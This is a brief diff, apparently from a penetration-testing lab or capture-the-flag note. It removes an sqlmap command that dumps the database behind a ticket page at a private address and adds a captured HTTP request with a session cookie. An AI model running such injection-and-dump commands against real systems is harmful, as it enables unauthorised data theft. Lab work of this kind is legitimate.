@@ -1,1 +1,11 @@
-sqlmap -u http://10.42.153.105/ticket?id=2 --cookie="session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.aWo1gQ.cvstVBRG3dRxLNcyxh71KBN4eWo" --dump
+GET /ticket?id=2 HTTP/1.1
+Host: 10.42.153.105
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://10.42.153.105/support
+Cookie: session=.eJxFyksKgCAURuG9_GMJmzoqWkIrULyR4AuvUhDtPaGBw_NxHqw2uMhQh_ZMAlvjmgKVIXvLOZXaoZbWm4J2Hgr8-3KRkbeU02lqhICzULNAYypRBxoj3g8vsSW4.aWo1gQ.cvstVBRG3dRxLNcyxh71KBN4eWo
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
